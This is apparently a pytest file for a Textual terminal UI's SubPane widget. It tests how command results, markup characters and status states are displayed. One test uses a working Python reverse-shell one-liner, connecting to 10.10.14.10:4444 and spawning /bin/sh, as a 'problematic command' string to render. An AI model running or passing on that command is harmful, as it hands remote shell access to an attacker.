"""Tests for the SubPane widget."""

import os
import tempfile
from datetime import datetime, timezone

import pytest
from textual.app import App, ComposeResult
from wish_models import CommandResult, LogFiles, CommandState, UtcDatetime

from wish_sh.tui.widgets.sub_pane import SubPane


class SubPaneTestApp(App):
    """Test application for SubPane."""

    def compose(self) -> ComposeResult:
        """Compose the application."""
        yield SubPane(id="sub-pane")


class TestSubPane:
    """Tests for the SubPane widget."""

    @pytest.mark.asyncio
    async def test_sub_pane_creation(self):
        """Test that a SubPane can be created."""
        app = SubPaneTestApp()
        async with app.run_test():
            pane = app.query_one(SubPane)
            assert pane is not None
            assert pane.id == "sub-pane"
            
            # Check that the pane shows the placeholder message
            content = app.query_one("#sub-pane-content")
            assert content is not None
            assert content.renderable == "(Select a command to view details)"

    @pytest.mark.asyncio
    async def test_sub_pane_update_for_new_wish_mode(self):
        """Test that a SubPane can be updated for New Wish mode."""
        app = SubPaneTestApp()
        async with app.run_test():
            pane = app.query_one(SubPane)
            
            # Update for New Wish mode
            pane.update_for_new_wish_mode()
            
            # Check that the content has been updated
            content = app.query_one("#sub-pane-content")
            assert content is not None
            assert pane.MSG_NEW_WISH_MODE in content.renderable

    @pytest.mark.asyncio
    async def test_sub_pane_update_command_output_none(self):
        """Test that a SubPane can be updated with no command result."""
        app = SubPaneTestApp()
        async with app.run_test():
            pane = app.query_one(SubPane)
            
            # Update with no command result
            pane.update_command_output(None)
            
            # Check that the pane shows the "No command selected" message
            content = app.query_one("#sub-pane-content")
            assert content is not None
            assert content.renderable == pane.MSG_NO_COMMAND_SELECTED

    @pytest.mark.asyncio
    async def test_sub_pane_update_command_output(self):
        """Test that a SubPane can be updated with a command result."""
        # Create a temporary file for stdout
        with tempfile.NamedTemporaryFile(mode="w+", delete=False) as stdout_file:
            stdout_file.write("Hello, world!\n")
            stdout_path = stdout_file.name
        
        # Create a temporary file for stderr
        with tempfile.NamedTemporaryFile(mode="w+", delete=False) as stderr_file:
            stderr_file.write("Error message\n")
            stderr_path = stderr_file.name
        
        try:
            # Create a test command result
            log_files = LogFiles(stdout=stdout_path, stderr=stderr_path)
            cmd_result = CommandResult.create(1, "echo 'Hello, world!'", log_files)
            
            # Set additional properties for testing
            cmd_result.state = CommandState.SUCCESS
            cmd_result.exit_code = 0
            cmd_result.log_summary = "Command executed successfully"
            cmd_result.finished_at = UtcDatetime.now()
            
            app = SubPaneTestApp()
            async with app.run_test():
                pane = app.query_one(SubPane)
                
                # Update with the test command result
                pane.update_command_output(cmd_result)
                
                # Check that the pane shows the command details
                content = app.query_one("#sub-pane-content")
                assert content is not None
                
                # Check basic command information
                assert f"Command:    #{cmd_result.num}" in content.renderable
                assert cmd_result.command in content.renderable
                assert "Status:     ✅ Success" in content.renderable
                assert "Exit Code:  0" in content.renderable
                
                # Check timestamps
                assert "Started:" in content.renderable
                assert "Finished:" in content.renderable
                assert "Duration:" in content.renderable
                
                # Check log summary
                assert "=== Log Summary ===" in content.renderable
                assert "Command executed successfully" in content.renderable
                
                # Check output sections
                assert "=== Standard Output ===" in content.renderable
                assert "Hello, world!" in content.renderable
                assert "=== Standard Error ===" in content.renderable
                assert "Error message" in content.renderable
        finally:
            # Clean up temporary files
            os.unlink(stdout_path)
            os.unlink(stderr_path)

    @pytest.mark.asyncio
    async def test_sub_pane_active_state(self):
        """Test that a SubPane can be set to active."""
        app = SubPaneTestApp()
        async with app.run_test():
            pane = app.query_one(SubPane)
            
            # Initially not active
            assert "active-pane" not in pane.classes
            
            # Set to active
            pane.set_active(True)
            assert "active-pane" in pane.classes
            
            # Set to inactive
            pane.set_active(False)
            assert "active-pane" not in pane.classes
    
    @pytest.mark.asyncio
    async def test_sub_pane_with_markup_characters(self):
        """Test that a SubPane can handle commands with markup characters."""
        # Create a temporary file for stdout with markup characters
        with tempfile.NamedTemporaryFile(mode="w+", delete=False) as stdout_file:
            stdout_file.write("Output with [bold]markup[/bold] characters\n")
            stdout_file.write("Another line with [red]colored[/red] text\n")
            stdout_path = stdout_file.name
        
        # Create a temporary file for stderr with markup characters
        with tempfile.NamedTemporaryFile(mode="w+", delete=False) as stderr_file:
            stderr_file.write("Error with [italic]markup[/italic] characters\n")
            stderr_file.write("Another error with [blue]colored[/blue] text\n")
            stderr_path = stderr_file.name
        
        try:
            # Create a test command result with markup characters
            log_files = LogFiles(stdout=stdout_path, stderr=stderr_path)
            cmd_result = CommandResult.create(1, "echo '[bold]Hello[/bold]'", log_files)
            
            # Set additional properties for testing
            cmd_result.state = CommandState.SUCCESS
            cmd_result.exit_code = 0
            
            app = SubPaneTestApp()
            async with app.run_test():
                pane = app.query_one(SubPane)
                
                # Update with the test command result
                pane.update_command_output(cmd_result)
                
                # Check that the content widget has markup disabled
                content = app.query_one("#sub-pane-content")
                assert content is not None
                assert content.markup is False
                
                # Check that the command with markup characters is displayed correctly
                rendered_text = content.renderable
                assert "echo '[bold]Hello[/bold]'" in rendered_text or "echo '【bold】Hello【/bold】'" in rendered_text
                
                # Check that stdout with markup characters is displayed correctly
                assert "Output with [bold]markup[/bold] characters" in rendered_text or "Output with 【bold】markup【/bold】 characters" in rendered_text
                assert "Another line with [red]colored[/red] text" in rendered_text or "Another line with 【red】colored【/red】 text" in rendered_text
                
                # Check that stderr with markup characters is displayed correctly
                assert "Error with [italic]markup[/italic] characters" in rendered_text or "Error with 【italic】markup【/italic】 characters" in rendered_text
                assert "Another error with [blue]colored[/blue] text" in rendered_text or "Another error with 【blue】colored【/blue】 text" in rendered_text
        finally:
            # Clean up temporary files
            os.unlink(stdout_path)
            os.unlink(stderr_path)
    
    @pytest.mark.asyncio
    async def test_sub_pane_with_problematic_command(self):
        """Test that a SubPane can handle problematic commands."""
        # Create empty temporary files for stdout and stderr
        with tempfile.NamedTemporaryFile(mode="w+", delete=False) as stdout_file:
            stdout_path = stdout_file.name
        
        with tempfile.NamedTemporaryFile(mode="w+", delete=False) as stderr_file:
            stderr_path = stderr_file.name
        
        try:
            # Create a test command result with problematic characters
            problematic_cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
            log_files = LogFiles(stdout=stdout_path, stderr=stderr_path)
            cmd_result = CommandResult.create(1, problematic_cmd, log_files)
            
            # Set additional properties for testing
            cmd_result.state = CommandState.NETWORK_ERROR
            cmd_result.exit_code = 1
            cmd_result.log_summary = "Network connection failed"
            cmd_result.finished_at = UtcDatetime.now()
            
            app = SubPaneTestApp()
            async with app.run_test():
                pane = app.query_one(SubPane)
                
                # Update with the test command result
                pane.update_command_output(cmd_result)
                
                # Check that the content widget has markup disabled
                content = app.query_one("#sub-pane-content")
                assert content is not None
                assert content.markup is False
                
                # The command should be displayed without causing errors
                # We don't check the exact text because the character replacement might vary,
                # but we ensure that the command is displayed in some form
                rendered_text = content.renderable
                assert "Command:" in rendered_text
                assert "python3 -c" in rendered_text
                
                # Check state and exit code
                assert "Status:     📡❌ Network Error" in rendered_text
                assert "Exit Code:  1" in rendered_text
                
                # Check log summary
                assert "Network connection failed" in rendered_text
                
                # Check that stdout and stderr sections are displayed
                assert "=== Standard Output ===" in rendered_text
                assert "=== Standard Error ===" in rendered_text
        finally:
            # Clean up temporary files
            os.unlink(stdout_path)
            os.unlink(stderr_path)
    @pytest.mark.asyncio
    async def test_sub_pane_with_running_command(self):
        """Test that a SubPane can handle a running command."""
        # Create empty temporary files for stdout and stderr
        with tempfile.NamedTemporaryFile(mode="w+", delete=False) as stdout_file:
            stdout_file.write("Running command output...\n")
            stdout_path = stdout_file.name
        
        with tempfile.NamedTemporaryFile(mode="w+", delete=False) as stderr_file:
            stderr_path = stderr_file.name
        
        try:
            # Create a test command result for a running command
            log_files = LogFiles(stdout=stdout_path, stderr=stderr_path)
            cmd_result = CommandResult.create(1, "long-running-command", log_files)
            
            # State should be DOING for a running command
            # finished_at and exit_code should be None
            
            app = SubPaneTestApp()
            async with app.run_test():
                pane = app.query_one(SubPane)
                
                # Update with the test command result
                pane.update_command_output(cmd_result)
                
                # Check that the content widget has markup disabled
                content = app.query_one("#sub-pane-content")
                assert content is not None
                
                # Check command information
                rendered_text = content.renderable
                assert "Command:    #1 long-running-command" in rendered_text
                assert "Status:     🔄 Running" in rendered_text
                
                # Check that exit_code is not displayed
                assert "Exit Code:" not in rendered_text
                
                # Check timestamps - should only have start time
                assert "Started:" in rendered_text
                assert "Finished:" not in rendered_text
                assert "Duration:" not in rendered_text
                
                # Check that log summary is not displayed
                assert "=== Log Summary ===" not in rendered_text
                
                # Check that stdout and stderr sections are displayed
                assert "=== Standard Output ===" in rendered_text
                assert "Running command output..." in rendered_text
                assert "=== Standard Error ===" in rendered_text
        finally:
            # Clean up temporary files
            os.unlink(stdout_path)
            os.unlink(stderr_path)
